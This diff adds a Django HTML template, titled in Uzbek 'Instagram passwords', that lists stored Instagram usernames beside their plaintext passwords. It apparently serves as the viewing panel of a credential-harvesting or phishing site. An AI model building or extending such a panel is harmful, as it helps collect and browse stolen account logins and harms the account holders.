@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+{%load static%}
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram parollar</title>
+    <link rel="stylesheet" href="{% static 'admin/css/insta.css' %}">
+</head>
+<body>
+<section>
+  <h1>INSTAGRAM PAROLLAR</h1>
+  <div class="tbl-header">
+    <table cellpadding="0" cellspacing="0" border="0">
+      <thead>
+        <tr>
+          <th>INSTAGRAM NOMI</th>
+          <th>PAROLI</th>
+        </tr>
+      </thead>
+    </table>
+  </div>
+  <div class="tbl-content">
+    <table cellpadding="0" cellspacing="0" border="0">
+      <tbody>
+      {%for i in insta %}
+        <tr>
+          <td>{{i.username}}</td>
+          <td>{{i.password}}</td>
+        </tr>
+        {%endfor%}
+      </tbody>
+    </table>
+  </div>
+</section>
+</body>
+</html>
